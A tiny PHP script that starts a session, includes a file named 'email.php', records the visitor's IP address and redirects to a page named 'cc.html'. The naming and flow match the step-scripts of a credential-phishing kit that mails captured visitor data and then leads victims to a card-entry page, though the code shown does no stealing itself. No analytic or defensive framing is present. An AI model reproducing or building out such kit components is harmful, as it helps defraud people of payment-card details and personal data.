<?php

session_start();

include '../../email.php';


$ip = getenv("REMOTE_ADDR");



HEADER("Location: ../cc.html");


?>

